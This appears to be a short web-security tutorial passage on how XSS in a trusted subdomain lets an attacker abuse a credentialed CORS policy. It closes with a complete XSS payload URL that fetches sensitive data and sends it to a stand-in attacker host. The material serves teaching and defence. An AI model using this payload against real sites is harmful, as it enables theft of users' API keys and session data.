<!-- @TODO: Link XSS -->
Even if properly configured CORS established a trusted and secured connection between two origins, if one origin trusted another origin that is vulnerable to Cross-Site Scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the origin that trusts the vulnerable application.

Given the following request:
```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```
If the server responds with:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
Then the attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, for example, using a URL like:
```txt
https://subdomain.vulnerable-website.com/?xss=<script>var xhr = new XMLHttpRequest(); var url = "https://vulnerable-website.com";  xhr.onreadystatechange = function () {  if (xhr.readyState == XMLHttpRequest.DONE) {   fetch("https://attacker-owned-website.com/log?key=" + xhr.responseText);  }; }; xhr.open("GET", url + "/sensitiveData", true); xhr.withCredentials = true; xhr.send(null);</script>
```